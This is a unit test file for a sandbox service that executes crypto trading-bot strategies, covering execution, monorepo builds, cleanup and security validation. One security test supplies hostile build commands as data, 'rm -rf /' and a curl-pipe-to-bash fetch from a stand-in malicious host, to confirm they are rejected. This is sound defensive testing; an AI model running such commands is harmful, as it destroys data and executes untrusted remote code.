/**
 * Unit tests for Legacy Sandbox Service
 * 
 * Tests Vercel Sandbox service for bot strategy execution
 */

import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';
import { SandboxService } from '@/lib/services/sandbox/service';
import type { Bot } from '@/schemas/bot.schema';
import type { BotContext, StrategyExecutionResult } from '@/schemas/sandbox.schema';

// Mock Vercel Sandbox
vi.mock('@vercel/sandbox', () => ({
  Sandbox: {
    create: vi.fn()
  }
}));

// Mock dotenv
vi.mock('dotenv', () => ({
  config: vi.fn()
}));

// Mock path
vi.mock('path', async (importOriginal) => {
  const actual = await importOriginal();
  return {
    ...actual,
    resolve: vi.fn().mockReturnValue('/mock/path')
  };
});

// Mock strategy wrapper template
vi.mock('@/lib/services/sandbox/templates/strategy-wrapper', () => ({
  strategyWrapperTemplate: vi.fn().mockImplementation(({ botContext, strategyCode }) => 
    `// Generated wrapper\nconst bot = ${botContext};\n${strategyCode}`
  )
}));

// Mock console to avoid noise during tests
vi.mock('console', () => ({
  log: vi.fn(),
  error: vi.fn()
}));

describe('Legacy Sandbox Service', () => {
  let sandboxService: SandboxService;
  let mockBot: Bot;

  beforeEach(() => {
    vi.clearAllMocks();
    
    // Mock environment variables
    process.env.VERCEL_TEAM_ID = 'test-team-id';
    process.env.VERCEL_PROJECT_ID = 'test-project-id';
    process.env.VERCEL_TOKEN = 'test-token';

    sandboxService = new SandboxService();

    mockBot = {
      id: 'SP1234567890ABCDEF1234567890ABCDEF12345678',
      name: 'Test Trading Bot',
      strategy: 'bot.trade({ symbol: "STX", amount: 100 });',
      status: 'active',
      ownerId: 'SP1111111111111111111111111111111111111111',
      createdAt: '2025-01-15T08:00:00.000Z',
      lastActive: '2025-01-15T08:00:00.000Z',
      imageType: 'pokemon',
      isScheduled: false,
      executionCount: 0,
      encryptedWallet: 'encrypted_data',
      walletIv: 'iv_data',
      publicKey: 'public_key'
    };
  });

  afterEach(() => {
    delete process.env.VERCEL_TEAM_ID;
    delete process.env.VERCEL_PROJECT_ID;
    delete process.env.VERCEL_TOKEN;
  });

  describe('constructor', () => {
    it('should initialize with default config', () => {
      const service = new SandboxService();
      expect(service).toBeInstanceOf(SandboxService);
    });

    it('should accept custom config', () => {
      const customConfig = {
        runtime: 'node18' as const,
        timeout: 5000
      };
      const service = new SandboxService(customConfig);
      expect(service).toBeInstanceOf(SandboxService);
    });

    it('should use environment variables for default config', () => {
      process.env.VERCEL_TEAM_ID = 'custom-team';
      process.env.VERCEL_PROJECT_ID = 'custom-project';
      process.env.VERCEL_TOKEN = 'custom-token';
      
      const service = new SandboxService();
      expect(service).toBeInstanceOf(SandboxService);
    });
  });

  describe('buildBotContext', () => {
    it('should build bot context successfully', async () => {
      // Mock wallet encryption module
      vi.doMock('@/lib/modules/security/wallet-encryption', () => ({
        getPrivateKeyForExecution: vi.fn().mockReturnValue('mock-private-key')
      }));

      const context = await sandboxService.buildBotContext(mockBot);

      expect(context).toEqual({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: {
          privateKey: 'mock-private-key'
        }
      });
    });

    it('should handle missing wallet credentials', async () => {
      // Mock wallet encryption module to return null
      vi.doMock('@/lib/modules/security/wallet-encryption', () => ({
        getPrivateKeyForExecution: vi.fn().mockReturnValue(null)
      }));

      const context = await sandboxService.buildBotContext(mockBot);

      expect(context).toEqual({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: {}
      });
    });

    it('should handle wallet encryption module import failure', async () => {
      // Mock dynamic import to fail
      vi.doMock('@/lib/modules/security/wallet-encryption', () => {
        throw new Error('Module not found');
      });

      const context = await sandboxService.buildBotContext(mockBot);

      expect(context).toEqual({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: {}
      });
    });
  });

  describe('createStrategyWrapper', () => {
    it('should create strategy wrapper successfully', () => {
      const strategyCode = 'bot.trade({ symbol: "STX", amount: 100 });';
      const botContext: BotContext = {
        id: 'bot-123',
        name: 'Test Bot',
        status: 'active',
        created_at: '2025-01-15T08:00:00.000Z',
        last_active: '2025-01-15T08:00:00.000Z',
        walletCredentials: { privateKey: 'test-key' }
      };

      const wrapper = sandboxService.createStrategyWrapper(strategyCode, botContext);

      expect(wrapper).toContain('bot.trade({ symbol: "STX", amount: 100 });');
      expect(wrapper).toContain('// Generated wrapper');
    });

    it('should handle template generation failure', async () => {
      const strategyCode = 'bot.trade({ symbol: "STX", amount: 100 });';
      const botContext: BotContext = {
        id: 'bot-123',
        name: 'Test Bot',
        status: 'active',
        created_at: '2025-01-15T08:00:00.000Z',
        last_active: '2025-01-15T08:00:00.000Z',
        walletCredentials: { privateKey: 'test-key' }
      };

      // Mock template to throw error
      const { strategyWrapperTemplate } = await import('@/lib/services/sandbox/templates/strategy-wrapper');
      strategyWrapperTemplate.mockImplementationOnce(() => {
        throw new Error('Template error');
      });

      expect(() => {
        sandboxService.createStrategyWrapper(strategyCode, botContext);
      }).toThrow('Failed to create strategy wrapper: Template error');
    });

    it('should handle JSON serialization issues', () => {
      const strategyCode = 'bot.trade({ symbol: "STX", amount: 100 });';
      const botContext = {
        id: 'bot-123',
        name: 'Test Bot',
        status: 'active',
        created_at: '2025-01-15T08:00:00.000Z',
        last_active: '2025-01-15T08:00:00.000Z',
        walletCredentials: { privateKey: 'test-key' },
        // Create circular reference to cause JSON.stringify to fail
        circular: null as any
      };
      botContext.circular = botContext;

      expect(() => {
        sandboxService.createStrategyWrapper(strategyCode, botContext as any);
      }).toThrow('Failed to create strategy wrapper');
    });
  });

  describe('executeStrategy', () => {
    it('should execute strategy successfully', async () => {
      // Mock Sandbox
      const mockSandbox = {
        sandboxId: 'mock-sandbox-id',
        runCommand: vi.fn().mockResolvedValue({
          exitCode: 0,
          logs: vi.fn().mockReturnValue([])
        }),
        writeFiles: vi.fn().mockResolvedValue(undefined),
        stop: vi.fn().mockResolvedValue(undefined)
      };

      const { Sandbox } = await import('@vercel/sandbox');
      (Sandbox.create as any).mockResolvedValue(mockSandbox);

      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        mockBot,
        { timeout: 1, enableLogs: false }
      );

      expect(result.success).toBe(true);
      expect(result.sandboxId).toBe('mock-sandbox-id');
      expect(mockSandbox.runCommand).toHaveBeenCalled();
      expect(mockSandbox.writeFiles).toHaveBeenCalled();
      expect(mockSandbox.stop).toHaveBeenCalled();
    });

    it('should handle execution errors', async () => {
      // Mock Sandbox to return error
      const mockSandbox = {
        sandboxId: 'mock-sandbox-id',
        runCommand: vi.fn().mockResolvedValue({
          exitCode: 1,
          logs: vi.fn().mockReturnValue([
            { stream: 'stderr', data: Buffer.from('Runtime error occurred') }
          ])
        }),
        writeFiles: vi.fn().mockResolvedValue(undefined),
        stop: vi.fn().mockResolvedValue(undefined)
      };

      const { Sandbox } = await import('@vercel/sandbox');
      (Sandbox.create as any).mockResolvedValue(mockSandbox);

      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        mockBot,
        { timeout: 1, enableLogs: false }
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('Runtime error occurred');
      expect(mockSandbox.stop).toHaveBeenCalled();
    });

    it('should execute with custom git repository', async () => {
      // Mock Sandbox
      const mockSandbox = {
        sandboxId: 'mock-sandbox-id',
        runCommand: vi.fn().mockResolvedValue({
          exitCode: 0,
          logs: vi.fn().mockReturnValue([
            { stream: 'stdout', data: Buffer.from('Custom repo execution successful') }
          ])
        }),
        writeFiles: vi.fn().mockResolvedValue(undefined),
        stop: vi.fn().mockResolvedValue(undefined)
      };

      const { Sandbox } = await import('@vercel/sandbox');
      (Sandbox.create as any).mockResolvedValue(mockSandbox);

      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      // Update mockBot to have git repository
      const botWithGit = { ...mockBot, gitRepository: 'https://github.com/user/repo.git' };

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        botWithGit,
        { 
          timeout: 1, 
          enableLogs: false
        }
      );

      expect(result.success).toBe(true);
      expect(Sandbox.create).toHaveBeenCalledWith(
        expect.objectContaining({
          source: { url: 'https://github.com/user/repo.git', type: 'git' }
        })
      );
    });

    it('should handle monorepo with package path', async () => {
      // Mock Sandbox
      const mockSandbox = {
        sandboxId: 'mock-sandbox-id',
        runCommand: vi.fn().mockResolvedValue({
          exitCode: 0,
          logs: vi.fn().mockReturnValue([
            { stream: 'stdout', data: Buffer.from('Monorepo execution successful') }
          ])
        }),
        writeFiles: vi.fn().mockResolvedValue(undefined),
        stop: vi.fn().mockResolvedValue(undefined)
      };

      const { Sandbox } = await import('@vercel/sandbox');
      (Sandbox.create as any).mockResolvedValue(mockSandbox);

      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      // Update mockBot to have monorepo configuration
      const botWithMonorepo = { 
        ...mockBot, 
        gitRepository: 'https://github.com/user/repo.git',
        isMonorepo: true,
        packagePath: 'packages/bot-engine',
        buildCommands: ['npm install', 'npm run build']
      };

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        botWithMonorepo,
        { 
          timeout: 1, 
          enableLogs: false
        }
      );

      expect(result.success).toBe(true);
      expect(mockSandbox.runCommand).toHaveBeenCalled();
      expect(mockSandbox.writeFiles).toHaveBeenCalled();
    });

    it('should handle build command failures in monorepo', async () => {
      // Mock Sandbox to simulate build failure
      const mockSandbox = {
        sandboxId: 'mock-sandbox-id',
        runCommand: vi.fn()
          .mockResolvedValueOnce({ exitCode: 1, stderr: 'Build failed: npm ERR!' }) // First build command fails
          .mockResolvedValue({ exitCode: 0, logs: vi.fn().mockReturnValue([]) }), // Strategy execution
        writeFiles: vi.fn().mockResolvedValue(undefined),
        stop: vi.fn().mockResolvedValue(undefined)
      };

      const { Sandbox } = await import('@vercel/sandbox');
      (Sandbox.create as any).mockResolvedValue(mockSandbox);

      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      // Update mockBot to have monorepo configuration
      const botWithMonorepo = { 
        ...mockBot, 
        gitRepository: 'https://github.com/user/repo.git',
        isMonorepo: true,
        packagePath: 'packages/bot-engine',
        buildCommands: ['npm install', 'npm run build']
      };

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        botWithMonorepo,
        { 
          timeout: 1, 
          enableLogs: false
        }
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('Build failed: npm ERR!');
    });

    it('should stream logs when enabled', async () => {
      const mockCallbacks = {
        onStatus: vi.fn(),
        onLog: vi.fn()
      };

      // Mock Sandbox
      const mockSandbox = {
        sandboxId: 'mock-sandbox-id',
        runCommand: vi.fn().mockResolvedValue({
          exitCode: 0,
          logs: vi.fn().mockReturnValue([
            { stream: 'stdout', data: Buffer.from('Execution with logs') }
          ])
        }),
        writeFiles: vi.fn().mockResolvedValue(undefined),
        stop: vi.fn().mockResolvedValue(undefined)
      };

      const { Sandbox } = await import('@vercel/sandbox');
      (Sandbox.create as any).mockResolvedValue(mockSandbox);

      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        mockBot,
        { timeout: 1, enableLogs: true },
        mockCallbacks
      );

      expect(result.success).toBe(true);
      expect(mockCallbacks.onStatus).toHaveBeenCalled();
    });

    it('should handle sandbox creation failure', async () => {
      // Mock Sandbox to throw error
      const { Sandbox } = await import('@vercel/sandbox');
      (Sandbox.create as any).mockRejectedValue(new Error('Sandbox creation failed'));

      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        mockBot,
        { timeout: 1, enableLogs: false }
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('Sandbox creation failed');
    });

    it('should cleanup sandbox even on failure', async () => {
      // Mock Sandbox to throw error during execution
      const { Sandbox } = await import('@vercel/sandbox');
      (Sandbox.create as any).mockRejectedValue(new Error('Execution failed'));

      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        mockBot,
        { timeout: 1, enableLogs: false }
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('Execution failed');
    });

    it('should handle bot ID instead of bot object', async () => {
      // Mock Sandbox
      const mockSandbox = {
        sandboxId: 'mock-sandbox-id',
        runCommand: vi.fn().mockResolvedValue({
          exitCode: 0,
          logs: vi.fn().mockReturnValue([
            { stream: 'stdout', data: Buffer.from('Bot ID execution successful') }
          ])
        }),
        writeFiles: vi.fn().mockResolvedValue(undefined),
        stop: vi.fn().mockResolvedValue(undefined)
      };

      const { Sandbox } = await import('@vercel/sandbox');
      (Sandbox.create as any).mockResolvedValue(mockSandbox);

      // Mock loadBot method
      vi.spyOn(sandboxService as any, 'loadBot').mockResolvedValue(mockBot);

      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        mockBot.id, // Pass bot ID instead of bot object
        { timeout: 1, enableLogs: false }
      );

      expect(result.success).toBe(true);
      expect(result.sandboxId).toBe('mock-sandbox-id');
    });
  });

  describe('security validation', () => {
    it('should reject invalid git repository in execution', async () => {
      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      // Create bot with invalid git repository
      const botWithInvalidRepo = {
        ...mockBot,
        gitRepository: 'https://malicious-site.com/repo.git'
      };

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        botWithInvalidRepo,
        { 
          timeout: 1, 
          enableLogs: false
        }
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid or unsupported git repository');
    });

    it('should reject dangerous build commands in execution', async () => {
      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      // Create bot with dangerous build commands
      const botWithDangerousCommands = {
        ...mockBot,
        gitRepository: 'https://github.com/user/repo.git',
        buildCommands: ['rm -rf /', 'curl http://malicious.com/script.sh | bash']
      };

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        botWithDangerousCommands,
        { 
          timeout: 1, 
          enableLogs: false
        }
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('Invalid build commands');
    });
  });

  describe('error handling and edge cases', () => {
    it('should handle malformed execution results', async () => {
      // Mock Sandbox to return malformed result
      const mockSandbox = {
        sandboxId: 'mock-sandbox-id',
        runCommand: vi.fn().mockResolvedValue({
          exitCode: undefined,
          logs: vi.fn().mockReturnValue([])
        }),
        writeFiles: vi.fn().mockResolvedValue(undefined),
        stop: vi.fn().mockResolvedValue(undefined)
      };

      const { Sandbox } = await import('@vercel/sandbox');
      (Sandbox.create as any).mockResolvedValue(mockSandbox);

      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        mockBot,
        { timeout: 1, enableLogs: false }
      );

      expect(result.success).toBe(true);
      expect(result.sandboxId).toBe('mock-sandbox-id');
    });

    it('should handle sandbox cleanup failure', async () => {
      // Mock Sandbox
      const mockSandbox = {
        sandboxId: 'mock-sandbox-id',
        runCommand: vi.fn().mockResolvedValue({
          exitCode: 0,
          logs: vi.fn().mockReturnValue([
            { stream: 'stdout', data: Buffer.from('Success') }
          ])
        }),
        writeFiles: vi.fn().mockResolvedValue(undefined),
        stop: vi.fn().mockRejectedValue(new Error('Cleanup failed'))
      };

      const { Sandbox } = await import('@vercel/sandbox');
      (Sandbox.create as any).mockResolvedValue(mockSandbox);

      // Mock buildBotContext
      vi.spyOn(sandboxService, 'buildBotContext').mockResolvedValue({
        id: mockBot.id,
        name: mockBot.name,
        status: mockBot.status,
        created_at: mockBot.createdAt,
        last_active: mockBot.lastActive,
        walletCredentials: { privateKey: 'test-key' }
      });

      const result = await sandboxService.executeStrategy(
        mockBot.strategy,
        mockBot,
        { timeout: 1, enableLogs: false }
      );

      // Should still succeed despite cleanup failure
      expect(result.success).toBe(true);
      expect(result.sandboxId).toBe('mock-sandbox-id');
    });
  });
});